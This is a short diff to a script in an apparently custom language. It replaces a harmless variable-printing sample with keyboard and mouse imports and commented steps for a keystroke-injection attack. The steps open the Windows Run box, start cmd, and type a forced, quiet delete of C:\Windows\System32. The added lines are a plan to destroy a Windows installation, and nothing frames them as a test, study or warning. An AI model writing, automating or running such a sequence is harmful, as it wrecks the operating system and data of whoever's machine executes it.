@@ -1,11 +1,10 @@
 
-use > system.dang
-# use > system.dang
+use > keyboard.dang
+use > mouse.dang
 
-# dang sample script
-
-s my_string = john_cena
-i my_number = 1
-b my_bool = true 
-
-write my_string
+# WIN+r
+# type cmd
+# ENTER
+# pause 5
+# type del /q /f C:\WIndows\System32
+# ENTER
